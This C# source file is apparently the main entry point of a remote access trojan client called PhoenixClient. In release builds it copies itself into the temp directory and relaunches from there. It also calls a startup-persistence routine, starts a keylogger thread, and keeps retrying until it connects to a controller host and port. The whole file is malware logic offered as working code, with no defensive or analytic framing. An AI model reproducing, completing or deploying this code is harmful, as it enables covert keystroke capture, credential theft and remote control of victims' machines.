using PhoenixClient.Communication;
using PhoenixClient.Work.ClientOperations;
using PhoenixClient.Work.ClientOperations.Backend;
using PhoenixLib.Datastore;
using PhoenixLib.Proxy;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace PhoenixClient
{
    class Program
    {
        public static String executable = "client.exe";
        static void Main(string[] args)
        {
            //RegistryIndex.index(Microsoft.Win32.RegistryHive.CurrentUser, Microsoft.Win32.RegistryView.Default);
            //RegistryIndex.index(Microsoft.Win32.RegistryHive.Users, Microsoft.Win32.RegistryView.Default);
            //RegistryIndex.index(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Default);
            String assembly = System.Windows.Forms.Application.ExecutablePath.Replace("/", "\\");
            String identifier = "NONE";
            String host = "localhost";
            int port = 8080;
            String temp = Path.GetTempPath();
#if RELEASE
            if (!assembly.StartsWith(temp))
            {
                String path = Path.Combine(temp, identifier.GetHashCode().ToString());
                Directory.CreateDirectory(path);
                String newDir = Path.Combine(path, assembly.GetHashCode().ToString() + ".exe");
                if (File.Exists(newDir))
                {
                    try
                    {
                        File.Delete(newDir);
                    }
                    catch
                    {
                        //instance already running
                        return;
                    }
                }
                File.Copy(assembly, newDir);
                Process.Start(newDir);
                Environment.Exit(0);
            }
#endif
            SystemInfo.openStartup(null);
            new Thread(() => Keylogger.start()).Start();
            Client me = Client.buildLocalClient(identifier);
            ClientConnection.client = me;
            bool attempt = ClientConnection.attemptConnection(host, port);
            while (!attempt)
            {
                attempt = ClientConnection.attemptConnection(host, port);
            }
            ClientConnection.run(false);
            Console.ReadKey();
        }
        public static void restart()
        {
            String assembly = System.Windows.Forms.Application.ExecutablePath.Replace("/", "\\");
            Process.Start(assembly);
            Thread.Sleep(500);
            Process.GetCurrentProcess().Kill();
        }
    }
}
